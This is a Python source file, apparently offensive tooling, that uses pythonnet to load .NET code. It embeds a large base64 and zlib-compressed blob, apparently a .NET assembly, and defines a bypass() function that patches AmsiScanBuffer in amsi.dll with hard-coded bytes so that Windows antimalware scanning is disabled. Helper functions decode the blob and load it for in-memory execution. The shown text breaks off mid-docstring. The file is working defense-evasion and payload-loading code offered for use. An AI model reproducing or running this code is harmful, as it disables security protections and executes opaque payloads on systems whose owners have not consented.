import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
